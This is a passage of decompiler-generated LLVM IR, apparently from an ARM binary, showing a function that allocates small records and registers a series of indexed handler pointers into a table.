  %v9_8614 = icmp eq i32 %v1_85f8, %v4_8610
  br i1 %v9_8614, label %dec_label_pc_8638, label %dec_label_pc_8620

dec_label_pc_8620:                                ; preds = %dec_label_pc_8620.preheader, %dec_label_pc_8610
  %v0_8618.in = phi i32 [ %v0_85f4, %dec_label_pc_8620.preheader ], [ %v0_8618, %dec_label_pc_8610 ]
  %v0_8620 = phi i32 [ 0, %dec_label_pc_8620.preheader ], [ %v1_8620, %dec_label_pc_8610 ]
  %v0_8618 = add i32 %v0_8618.in, 8
  %v1_8620 = add i32 %v0_8620, 1
  store i32 %v1_8620, i32* @lr, align 4
  %v9_8624 = icmp eq i32 %v1_85e0, %v1_8620
  store i32 %v0_8618, i32* %r1.global-to-local, align 4
  br i1 %v9_8624, label %dec_label_pc_8630, label %dec_label_pc_8610

dec_label_pc_8630:                                ; preds = %dec_label_pc_8620, %dec_label_pc_8638, %dec_label_pc_85e0
  store i32 %v3_85e8, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_8638:                                ; preds = %dec_label_pc_8610, %dec_label_pc_85f4
  %v0_8638 = phi i32 [ %v0_85f4, %dec_label_pc_85f4 ], [ %v0_8618, %dec_label_pc_8610 ]
  %v1_8638 = inttoptr i32 %v0_8638 to i32*
  %v2_8638 = load i32, i32* %v1_8638, align 4
  %v2_863c = icmp eq i32 %v2_8638, 0
  br i1 %v2_863c, label %dec_label_pc_8630, label %dec_label_pc_8644

dec_label_pc_8644:                                ; preds = %dec_label_pc_8638
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v3_85e8, i32* @r4, align 4
  store i32 %v6_85e8, i32* @lr, align 4
  %v2_864c = inttoptr i32 %v2_8638 to i8*
  %v3_864c = call i32 @function_11318(i8* %v2_864c, i32 10)
  ret i32 %v3_864c

; uselistorder directives
  uselistorder i32 %v1_8620, { 1, 2, 0 }
  uselistorder i32 %v0_8618, { 1, 0, 2 }
  uselistorder i32 %v0_8618.in, { 1, 0 }
  uselistorder i32 %v1_85f8, { 1, 0 }
  uselistorder i32 %v0_85f4, { 1, 0, 2 }
  uselistorder i32 %v3_85e8, { 1, 0 }
  uselistorder i32 %v1_85e0, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8630, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8620, { 1, 0 }
}

define i32 @function_8650(i32 %arg1) local_unnamed_addr {
dec_label_pc_8650:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8650 = load i32, i32* @r4, align 4
  store i32 %v3_8650, i32* %stack_var_-24, align 4
  %v6_8650 = load i32, i32* @r5, align 4
  %v9_8650 = load i32, i32* @r6, align 4
  %v12_8650 = load i32, i32* @r7, align 4
  %v15_8650 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_865c = call i32 @function_126cc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_1ca7c.21 to i32), i32* @r4, align 4
  %v2_8664 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_8664 = zext i8 %v2_8664 to i32
  store i32 ptrtoint (i32* @global_var_1ca80.23 to i32), i32* @r6, align 4
  store i32 36768, i32* %r2.global-to-local, align 4
  store i32 %v2_865c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_8678 = mul nuw nsw i32 %v3_8664, 4
  store i32 %v3_8678, i32* %r1.global-to-local, align 4
  %v2_867c = load i32, i32* @global_var_1ca80.23, align 4
  %v2_8680 = inttoptr i32 %v2_865c to i32*
  store i32 36768, i32* %v2_8680, align 4
  %v3_8684 = load i32, i32* @r5, align 4
  %v4_8684 = add i32 %v3_8684, 4
  %v5_8684 = inttoptr i32 %v4_8684 to i8*
  store i8 0, i8* %v5_8684, align 1
  %v0_8688 = load i32, i32* %r1.global-to-local, align 4
  %v1_8688 = add i32 %v0_8688, 4
  store i32 %v1_8688, i32* %r1.global-to-local, align 4
  %v5_868c = call i32 @function_12814(i32 %v2_867c, i32 %v1_8688, i32 36768, i32 0)
  %v2_8690 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_8690 = zext i8 %v2_8690 to i32
  store i32 %v3_8690, i32* %r3.global-to-local, align 4
  store i32 %v5_868c, i32* %ip.global-to-local, align 4
  %v0_8698 = load i32, i32* @r5, align 4
  %v5_8698 = mul nuw nsw i32 %v3_8690, 4
  %v6_8698 = add i32 %v5_8698, %v5_868c
  %v7_8698 = inttoptr i32 %v6_8698 to i32*
  store i32 %v0_8698, i32* %v7_8698, align 4
  store i32 ptrtoint (i8* @global_var_1ca7d.29 to i32), i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v3_86a8 = load i32, i32* @r4, align 4
  %v4_86a8 = inttoptr i32 %v3_86a8 to i8*
  store i8 ptrtoint (i8* @global_var_1ca7d.29 to i8), i8* %v4_86a8, align 1
  %v0_86ac = load i32, i32* %ip.global-to-local, align 4
  %v1_86ac = load i32, i32* @r6, align 4
  %v2_86ac = inttoptr i32 %v1_86ac to i32*
  store i32 %v0_86ac, i32* %v2_86ac, align 4
  %v2_86b0 = call i32 @function_126cc(i32 1, i32 8)
  %v2_86b4 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_86b4 = zext i8 %v2_86b4 to i32
  store i32 ptrtoint (i32* @global_var_a4c4.31 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_86b0, i32* @r5, align 4
  %v3_86c4 = mul nuw nsw i32 %v3_86b4, 4
  store i32 %v3_86c4, i32* %r1.global-to-local, align 4
  %v2_86c8 = load i32, i32* @global_var_1ca80.23, align 4
  %v2_86cc = inttoptr i32 %v2_86b0 to i32*
  store i32 ptrtoint (i32* @global_var_a4c4.31 to i32), i32* %v2_86cc, align 4
  %v0_86d0 = load i32, i32* @r8, align 4
  %v1_86d0 = trunc i32 %v0_86d0 to i8
  %v2_86d0 = load i32, i32* @r5, align 4
  %v3_86d0 = add i32 %v2_86d0, 4
  %v4_86d0 = inttoptr i32 %v3_86d0 to i8*
  store i8 %v1_86d0, i8* %v4_86d0, align 1
  %v0_86d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_86d4 = add i32 %v0_86d4, 4
  store i32 %v1_86d4, i32* %r1.global-to-local, align 4
  %v5_86d8 = call i32 @function_12814(i32 %v2_86c8, i32 %v1_86d4, i32 sext (i8 ptrtoint (i8* @global_var_1ca7d.29 to i8) to i32), i32 ptrtoint (i32* @global_var_a4c4.31 to i32))
  %v2_86dc = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_86dc = zext i8 %v2_86dc to i32
  store i32 %v3_86dc, i32* %r3.global-to-local, align 4
  store i32 %v5_86d8, i32* %ip.global-to-local, align 4
  %v0_86e4 = load i32, i32* @r5, align 4
  %v5_86e4 = mul nuw nsw i32 %v3_86dc, 4
  %v6_86e4 = add i32 %v5_86e4, %v5_86d8
  %v7_86e4 = inttoptr i32 %v6_86e4 to i32*
  store i32 %v0_86e4, i32* %v7_86e4, align 4
  %v0_86e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_86e8 = load i32, i32* @r8, align 4
  %v2_86e8 = add i32 %v1_86e8, %v0_86e8
  store i32 %v2_86e8, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_86f4 = load i32, i32* @r6, align 4
  %v2_86f4 = inttoptr i32 %v1_86f4 to i32*
  store i32 %v0_86f4, i32* %v2_86f4, align 4
  %v0_86f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86f8 = trunc i32 %v0_86f8 to i8
  %v2_86f8 = load i32, i32* @r4, align 4
  %v3_86f8 = inttoptr i32 %v2_86f8 to i8*
  store i8 %v1_86f8, i8* %v3_86f8, align 1
  %v2_86fc = call i32 @function_126cc(i32 %v1_86e8, i32 8)
  %v2_8700 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_8700 = zext i8 %v2_8700 to i32
  store i32 ptrtoint (i32* @global_var_a988.33 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86fc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_8710 = mul nuw nsw i32 %v3_8700, 4
  store i32 %v3_8710, i32* %r1.global-to-local, align 4
  %v2_8714 = load i32, i32* @global_var_1ca80.23, align 4
  %v2_8718 = inttoptr i32 %v2_86fc to i32*
  store i32 ptrtoint (i32* @global_var_a988.33 to i32), i32* %v2_8718, align 4
  %v3_871c = load i32, i32* @r5, align 4
  %v4_871c = add i32 %v3_871c, 4
  %v5_871c = inttoptr i32 %v4_871c to i8*
  store i8 2, i8* %v5_871c, align 1
  %v0_8720 = load i32, i32* %r1.global-to-local, align 4
  %v1_8720 = add i32 %v0_8720, 4
  store i32 %v1_8720, i32* %r1.global-to-local, align 4
  %v5_8724 = call i32 @function_12814(i32 %v2_8714, i32 %v1_8720, i32 ptrtoint (i32* @global_var_a988.33 to i32), i32 2)
  %v2_8728 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_8728 = zext i8 %v2_8728 to i32
  store i32 %v3_8728, i32* %r3.global-to-local, align 4
  store i32 %v5_8724, i32* %ip.global-to-local, align 4
  %v1_8730 = load i32, i32* @r8, align 4
  %v2_8730 = add i32 %v1_8730, %v3_8728
  %v3_8730 = trunc i32 %v2_8730 to i8
  store i32 %v2_8730, i32* %r2.global-to-local, align 4
  %v0_8734 = load i32, i32* @r5, align 4
  %v5_8734 = mul nuw nsw i32 %v3_8728, 4
  %v6_8734 = add i32 %v5_8734, %v5_8724
  %v7_8734 = inttoptr i32 %v6_8734 to i32*
  store i32 %v0_8734, i32* %v7_8734, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_873c = load i32, i32* @r8, align 4
  %v3_8740 = load i32, i32* @r4, align 4
  %v4_8740 = inttoptr i32 %v3_8740 to i8*
  store i8 %v3_8730, i8* %v4_8740, align 1
  %v0_8744 = load i32, i32* %ip.global-to-local, align 4
  %v1_8744 = load i32, i32* @r6, align 4
  %v2_8744 = inttoptr i32 %v1_8744 to i32*
  store i32 %v0_8744, i32* %v2_8744, align 4
  %v2_8748 = call i32 @function_126cc(i32 %v0_873c, i32 8)
  %v2_874c = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_874c = zext i8 %v2_874c to i32
  store i32 ptrtoint (i32* @global_var_89d8.35 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8748, i32* @r5, align 4
  %v3_875c = mul nuw nsw i32 %v3_874c, 4
  store i32 %v3_875c, i32* %r1.global-to-local, align 4
  %v2_8760 = load i32, i32* @global_var_1ca80.23, align 4
  %v2_8764 = inttoptr i32 %v2_8748 to i32*
  store i32 ptrtoint (i32* @global_var_89d8.35 to i32), i32* %v2_8764, align 4
  %v0_8768 = load i32, i32* @r7, align 4
  %v1_8768 = trunc i32 %v0_8768 to i8
  %v2_8768 = load i32, i32* @r5, align 4
  %v3_8768 = add i32 %v2_8768, 4
  %v4_8768 = inttoptr i32 %v3_8768 to i8*
  store i8 %v1_8768, i8* %v4_8768, align 1
  %v0_876c = load i32, i32* %r1.global-to-local, align 4
  %v1_876c = add i32 %v0_876c, 4
  store i32 %v1_876c, i32* %r1.global-to-local, align 4
  %v5_8770 = call i32 @function_12814(i32 %v2_8760, i32 %v1_876c, i32 %v2_8730, i32 ptrtoint (i32* @global_var_89d8.35 to i32))
  %v2_8774 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_8774 = zext i8 %v2_8774 to i32
  store i32 %v3_8774, i32* %r3.global-to-local, align 4
  store i32 %v5_8770, i32* %ip.global-to-local, align 4
  %v0_877c = load i32, i32* @r5, align 4
  %v5_877c = mul nuw nsw i32 %v3_8774, 4
  %v6_877c = add i32 %v5_877c, %v5_8770
  %v7_877c = inttoptr i32 %v6_877c to i32*
  store i32 %v0_877c, i32* %v7_877c, align 4
  %v0_8780 = load i32, i32* %r3.global-to-local, align 4
  %v1_8780 = load i32, i32* @r8, align 4
  %v2_8780 = add i32 %v1_8780, %v0_8780
  store i32 %v2_8780, i32* %r2.global-to-local, align 4
  %v0_8784 = load i32, i32* @r7, align 4
  store i32 %v0_8784, i32* %r1.global-to-local, align 4
  %v0_878c = load i32, i32* %ip.global-to-local, align 4
  %v1_878c = load i32, i32* @r6, align 4
  %v2_878c = inttoptr i32 %v1_878c to i32*
  store i32 %v0_878c, i32* %v2_878c, align 4
  %v0_8790 = load i32, i32* %r2.global-to-local, align 4
  %v1_8790 = trunc i32 %v0_8790 to i8
  %v2_8790 = load i32, i32* @r4, align 4
  %v3_8790 = inttoptr i32 %v2_8790 to i8*
  store i8 %v1_8790, i8* %v3_8790, align 1
  %v2_8794 = call i32 @function_126cc(i32 %v1_8780, i32 %v0_8784)
  %v2_8798 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_8798 = zext i8 %v2_8798 to i32
  store i32 ptrtoint (i32* @global_var_c96c.37 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8794, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_87a8 = mul nuw nsw i32 %v3_8798, 4
  store i32 %v3_87a8, i32* %r1.global-to-local, align 4
  %v2_87ac = load i32, i32* @global_var_1ca80.23, align 4
  %v2_87b0 = inttoptr i32 %v2_8794 to i32*
  store i32 ptrtoint (i32* @global_var_c96c.37 to i32), i32* %v2_87b0, align 4
  %v3_87b4 = load i32, i32* @r5, align 4
  %v4_87b4 = add i32 %v3_87b4, 4
  %v5_87b4 = inttoptr i32 %v4_87b4 to i8*
  store i8 3, i8* %v5_87b4, align 1
  %v0_87b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_87b8 = add i32 %v0_87b8, 4
  store i32 %v1_87b8, i32* %r1.global-to-local, align 4
  %v5_87bc = call i32 @function_12814(i32 %v2_87ac, i32 %v1_87b8, i32 ptrtoint (i32* @global_var_c96c.37 to i32), i32 3)
  %v2_87c0 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_87c0 = zext i8 %v2_87c0 to i32
  store i32 %v3_87c0, i32* %r3.global-to-local, align 4
  store i32 %v5_87bc, i32* %ip.global-to-local, align 4
  %v0_87c8 = load i32, i32* @r5, align 4
  %v5_87c8 = mul nuw nsw i32 %v3_87c0, 4
  %v6_87c8 = add i32 %v5_87c8, %v5_87bc
  %v7_87c8 = inttoptr i32 %v6_87c8 to i32*
  store i32 %v0_87c8, i32* %v7_87c8, align 4
  %v0_87cc = load i32, i32* %r3.global-to-local, align 4
  %v1_87cc = load i32, i32* @r8, align 4
  %v2_87cc = add i32 %v1_87cc, %v0_87cc
  store i32 %v2_87cc, i32* %r2.global-to-local, align 4
  %v0_87d0 = load i32, i32* @r7, align 4
  store i32 %v0_87d0, i32* %r1.global-to-local, align 4
  %v0_87d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_87d8 = load i32, i32* @r6, align 4
  %v2_87d8 = inttoptr i32 %v1_87d8 to i32*
  store i32 %v0_87d8, i32* %v2_87d8, align 4
  %v0_87dc = load i32, i32* %r2.global-to-local, align 4
  %v1_87dc = trunc i32 %v0_87dc to i8
  %v2_87dc = load i32, i32* @r4, align 4
  %v3_87dc = inttoptr i32 %v2_87dc to i8*
  store i8 %v1_87dc, i8* %v3_87dc, align 1
  %v2_87e0 = call i32 @function_126cc(i32 %v1_87cc, i32 %v0_87d0)
  %v2_87e4 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_87e4 = zext i8 %v2_87e4 to i32
  store i32 ptrtoint (i32* @global_var_c1f8.39 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87e0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_87f4 = mul nuw nsw i32 %v3_87e4, 4
  store i32 %v3_87f4, i32* %r1.global-to-local, align 4
  %v2_87f8 = load i32, i32* @global_var_1ca80.23, align 4
  %v2_87fc = inttoptr i32 %v2_87e0 to i32*
  store i32 ptrtoint (i32* @global_var_c1f8.39 to i32), i32* %v2_87fc, align 4
  %v3_8800 = load i32, i32* @r5, align 4
  %v4_8800 = add i32 %v3_8800, 4
  %v5_8800 = inttoptr i32 %v4_8800 to i8*
  store i8 4, i8* %v5_8800, align 1
  %v0_8804 = load i32, i32* %r1.global-to-local, align 4
  %v1_8804 = add i32 %v0_8804, 4
  store i32 %v1_8804, i32* %r1.global-to-local, align 4
  %v5_8808 = call i32 @function_12814(i32 %v2_87f8, i32 %v1_8804, i32 ptrtoint (i32* @global_var_c1f8.39 to i32), i32 4)
  %v2_880c = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_880c = zext i8 %v2_880c to i32
  store i32 %v3_880c, i32* %r3.global-to-local, align 4
  store i32 %v5_8808, i32* %ip.global-to-local, align 4
  %v0_8814 = load i32, i32* @r5, align 4
  %v5_8814 = mul nuw nsw i32 %v3_880c, 4
  %v6_8814 = add i32 %v5_8814, %v5_8808
  %v7_8814 = inttoptr i32 %v6_8814 to i32*
  store i32 %v0_8814, i32* %v7_8814, align 4
  %v0_8818 = load i32, i32* %r3.global-to-local, align 4
  %v1_8818 = load i32, i32* @r8, align 4
  %v2_8818 = add i32 %v1_8818, %v0_8818
  store i32 %v2_8818, i32* %r2.global-to-local, align 4
  %v0_881c = load i32, i32* @r7, align 4
  store i32 %v0_881c, i32* %r1.global-to-local, align 4
  %v0_8824 = load i32, i32* %ip.global-to-local, align 4
  %v1_8824 = load i32, i32* @r6, align 4
  %v2_8824 = inttoptr i32 %v1_8824 to i32*
  store i32 %v0_8824, i32* %v2_8824, align 4
  %v0_8828 = load i32, i32* %r2.global-to-local, align 4
  %v1_8828 = trunc i32 %v0_8828 to i8
  %v2_8828 = load i32, i32* @r4, align 4
  %v3_8828 = inttoptr i32 %v2_8828 to i8*
  store i8 %v1_8828, i8* %v3_8828, align 1
  %v2_882c = call i32 @function_126cc(i32 %v1_8818, i32 %v0_881c)
  %v2_8830 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_8830 = zext i8 %v2_8830 to i32
  store i32 ptrtoint (i32* @global_var_b998.41 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_882c, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_8840 = mul nuw nsw i32 %v3_8830, 4
  store i32 %v3_8840, i32* %r1.global-to-local, align 4
  %v2_8844 = load i32, i32* @global_var_1ca80.23, align 4
  %v2_8848 = inttoptr i32 %v2_882c to i32*
  store i32 ptrtoint (i32* @global_var_b998.41 to i32), i32* %v2_8848, align 4
  %v3_884c = load i32, i32* @r5, align 4
  %v4_884c = add i32 %v3_884c, 4
  %v5_884c = inttoptr i32 %v4_884c to i8*
  store i8 5, i8* %v5_884c, align 1
  %v0_8850 = load i32, i32* %r1.global-to-local, align 4
  %v1_8850 = add i32 %v0_8850, 4
  store i32 %v1_8850, i32* %r1.global-to-local, align 4
  %v5_8854 = call i32 @function_12814(i32 %v2_8844, i32 %v1_8850, i32 ptrtoint (i32* @global_var_b998.41 to i32), i32 5)
  %v2_8858 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_8858 = zext i8 %v2_8858 to i32
  store i32 %v3_8858, i32* %r3.global-to-local, align 4
  store i32 %v5_8854, i32* %ip.global-to-local, align 4
  %v0_8860 = load i32, i32* @r5, align 4
  %v5_8860 = mul nuw nsw i32 %v3_8858, 4
  %v6_8860 = add i32 %v5_8860, %v5_8854
  %v7_8860 = inttoptr i32 %v6_8860 to i32*
  store i32 %v0_8860, i32* %v7_8860, align 4
  %v0_8864 = load i32, i32* %r3.global-to-local, align 4
  %v1_8864 = load i32, i32* @r8, align 4
  %v2_8864 = add i32 %v1_8864, %v0_8864
  store i32 %v2_8864, i32* %r2.global-to-local, align 4
  %v0_8868 = load i32, i32* @r7, align 4
  store i32 %v0_8868, i32* %r1.global-to-local, align 4
  %v0_8870 = load i32, i32* %ip.global-to-local, align 4
  %v1_8870 = load i32, i32* @r6, align 4
  %v2_8870 = inttoptr i32 %v1_8870 to i32*
  store i32 %v0_8870, i32* %v2_8870, align 4
  %v0_8874 = load i32, i32* %r2.global-to-local, align 4
  %v1_8874 = trunc i32 %v0_8874 to i8
  %v2_8874 = load i32, i32* @r4, align 4
  %v3_8874 = inttoptr i32 %v2_8874 to i8*
  store i8 %v1_8874, i8* %v3_8874, align 1
  %v2_8878 = call i32 @function_126cc(i32 %v1_8864, i32 %v0_8868)
  %v2_887c = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_887c = zext i8 %v2_887c to i32
  store i32 45368, i32* %r2.global-to-local, align 4
  store i32 %v2_8878, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v3_888c = mul nuw nsw i32 %v3_887c, 4
  store i32 %v3_888c, i32* %r1.global-to-local, align 4
  %v2_8890 = load i32, i32* @global_var_1ca80.23, align 4
  %v2_8894 = inttoptr i32 %v2_8878 to i32*
  store i32 45368, i32* %v2_8894, align 4
  %v3_8898 = load i32, i32* @r5, align 4
  %v4_8898 = add i32 %v3_8898, 4
  %v5_8898 = inttoptr i32 %v4_8898 to i8*
  store i8 10, i8* %v5_8898, align 1
  %v0_889c = load i32, i32* %r1.global-to-local, align 4
  %v1_889c = add i32 %v0_889c, 4
  store i32 %v1_889c, i32* %r1.global-to-local, align 4
  %v5_88a0 = call i32 @function_12814(i32 %v2_8890, i32 %v1_889c, i32 45368, i32 10)
  %v2_88a4 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_88a4 = zext i8 %v2_88a4 to i32
  store i32 %v3_88a4, i32* %r3.global-to-local, align 4
  store i32 %v5_88a0, i32* %ip.global-to-local, align 4
  %v0_88ac = load i32, i32* @r5, align 4
  %v5_88ac = mul nuw nsw i32 %v3_88a4, 4
  %v6_88ac = add i32 %v5_88ac, %v5_88a0
  %v7_88ac = inttoptr i32 %v6_88ac to i32*
  store i32 %v0_88ac, i32* %v7_88ac, align 4
  %v0_88b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88b0 = load i32, i32* @r8, align 4
  %v2_88b0 = add i32 %v1_88b0, %v0_88b0
  store i32 %v2_88b0, i32* %r2.global-to-local, align 4
  %v0_88b4 = load i32, i32* @r7, align 4
  store i32 %v0_88b4, i32* %r1.global-to-local, align 4
  %v0_88bc = load i32, i32* %ip.global-to-local, align 4
  %v1_88bc = load i32, i32* @r6, align 4
  %v2_88bc = inttoptr i32 %v1_88bc to i32*
  store i32 %v0_88bc, i32* %v2_88bc, align 4
  %v0_88c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_88c0 = trunc i32 %v0_88c0 to i8
  %v2_88c0 = load i32, i32* @r4, align 4
  %v3_88c0 = inttoptr i32 %v2_88c0 to i8*
  store i8 %v1_88c0, i8* %v3_88c0, align 1
  %v2_88c4 = call i32 @function_126cc(i32 %v1_88b0, i32 %v0_88b4)
  %v2_88c8 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_88c8 = zext i8 %v2_88c8 to i32
  store i32 ptrtoint (i32* @global_var_9da8.44 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88c4, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_88d8 = mul nuw nsw i32 %v3_88c8, 4
  store i32 %v3_88d8, i32* %r1.global-to-local, align 4
  %v2_88dc = load i32, i32* @global_var_1ca80.23, align 4
  %v2_88e0 = inttoptr i32 %v2_88c4 to i32*
  store i32 ptrtoint (i32* @global_var_9da8.44 to i32), i32* %v2_88e0, align 4
  %v3_88e4 = load i32, i32* @r5, align 4
  %v4_88e4 = add i32 %v3_88e4, 4
  %v5_88e4 = inttoptr i32 %v4_88e4 to i8*
  store i8 6, i8* %v5_88e4, align 1
  %v0_88e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_88e8 = add i32 %v0_88e8, 4
  store i32 %v1_88e8, i32* %r1.global-to-local, align 4
  %v5_88ec = call i32 @function_12814(i32 %v2_88dc, i32 %v1_88e8, i32 ptrtoint (i32* @global_var_9da8.44 to i32), i32 6)
  %v2_88f0 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_88f0 = zext i8 %v2_88f0 to i32
  store i32 %v3_88f0, i32* %r3.global-to-local, align 4
  store i32 %v5_88ec, i32* %ip.global-to-local, align 4
  %v0_88f8 = load i32, i32* @r5, align 4
  %v5_88f8 = mul nuw nsw i32 %v3_88f0, 4
  %v6_88f8 = add i32 %v5_88f8, %v5_88ec
  %v7_88f8 = inttoptr i32 %v6_88f8 to i32*
  store i32 %v0_88f8, i32* %v7_88f8, align 4
  %v0_88fc = load i32, i32* %r3.global-to-local, align 4
  %v1_88fc = load i32, i32* @r8, align 4
  %v2_88fc = add i32 %v1_88fc, %v0_88fc
  store i32 %v2_88fc, i32* %r2.global-to-local, align 4
  %v0_8900 = load i32, i32* @r7, align 4
  store i32 %v0_8900, i32* %r1.global-to-local, align 4
  %v0_8908 = load i32, i32* %ip.global-to-local, align 4
  %v1_8908 = load i32, i32* @r6, align 4
  %v2_8908 = inttoptr i32 %v1_8908 to i32*
  store i32 %v0_8908, i32* %v2_8908, align 4
  %v0_890c = load i32, i32* %r2.global-to-local, align 4
  %v1_890c = trunc i32 %v0_890c to i8
  %v2_890c = load i32, i32* @r4, align 4
  %v3_890c = inttoptr i32 %v2_890c to i8*
  store i8 %v1_890c, i8* %v3_890c, align 1
  %v2_8910 = call i32 @function_126cc(i32 %v1_88fc, i32 %v0_8900)
  %v2_8914 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_8914 = zext i8 %v2_8914 to i32
  store i32 ptrtoint (i32* @global_var_962c.46 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8910, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_8924 = mul nuw nsw i32 %v3_8914, 4
  store i32 %v3_8924, i32* %r1.global-to-local, align 4
  %v2_8928 = load i32, i32* @global_var_1ca80.23, align 4
  %v2_892c = inttoptr i32 %v2_8910 to i32*
  store i32 ptrtoint (i32* @global_var_962c.46 to i32), i32* %v2_892c, align 4
  %v3_8930 = load i32, i32* @r5, align 4
  %v4_8930 = add i32 %v3_8930, 4
  %v5_8930 = inttoptr i32 %v4_8930 to i8*
  store i8 7, i8* %v5_8930, align 1
  %v0_8934 = load i32, i32* %r1.global-to-local, align 4
  %v1_8934 = add i32 %v0_8934, 4
  store i32 %v1_8934, i32* %r1.global-to-local, align 4
  %v5_8938 = call i32 @function_12814(i32 %v2_8928, i32 %v1_8934, i32 ptrtoint (i32* @global_var_962c.46 to i32), i32 7)
  %v2_893c = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_893c = zext i8 %v2_893c to i32
  store i32 %v3_893c, i32* %r3.global-to-local, align 4
  store i32 %v5_8938, i32* %ip.global-to-local, align 4
  %v0_8944 = load i32, i32* @r5, align 4
  %v5_8944 = mul nuw nsw i32 %v3_893c, 4
  %v6_8944 = add i32 %v5_8944, %v5_8938
  %v7_8944 = inttoptr i32 %v6_8944 to i32*
  store i32 %v0_8944, i32* %v7_8944, align 4
  %v0_8948 = load i32, i32* %r3.global-to-local, align 4
  %v1_8948 = load i32, i32* @r8, align 4
  %v2_8948 = add i32 %v1_8948, %v0_8948
  store i32 %v2_8948, i32* %r2.global-to-local, align 4
  %v0_894c = load i32, i32* @r7, align 4
  store i32 %v0_894c, i32* %r1.global-to-local, align 4
  %v1_8954 = trunc i32 %v2_8948 to i8
  %v2_8954 = load i32, i32* @r4, align 4
  %v3_8954 = inttoptr i32 %v2_8954 to i8*
  store i8 %v1_8954, i8* %v3_8954, align 1
  %v0_8958 = load i32, i32* %ip.global-to-local, align 4
  %v1_8958 = load i32, i32* @r6, align 4
  %v2_8958 = inttoptr i32 %v1_8958 to i32*
  store i32 %v0_8958, i32* %v2_8958, align 4
  %v2_895c = call i32 @function_126cc(i32 %v1_8948, i32 %v0_894c)
  %v2_8960 = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_8960 = zext i8 %v2_8960 to i32
  store i32 36028, i32* %r2.global-to-local, align 4
  store i32 %v2_895c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v3_8970 = mul nuw nsw i32 %v3_8960, 4
  store i32 %v3_8970, i32* %r1.global-to-local, align 4
  %v2_8974 = load i32, i32* @global_var_1ca80.23, align 4
  %v2_8978 = inttoptr i32 %v2_895c to i32*
  store i32 36028, i32* %v2_8978, align 4
  %v3_897c = load i32, i32* @r5, align 4
  %v4_897c = add i32 %v3_897c, 4
  %v5_897c = inttoptr i32 %v4_897c to i8*
  store i8 9, i8* %v5_897c, align 1
  %v0_8980 = load i32, i32* %r1.global-to-local, align 4
  %v1_8980 = add i32 %v0_8980, 4
  store i32 %v1_8980, i32* %r1.global-to-local, align 4
  %v5_8984 = call i32 @function_12814(i32 %v2_8974, i32 %v1_8980, i32 36028, i32 9)
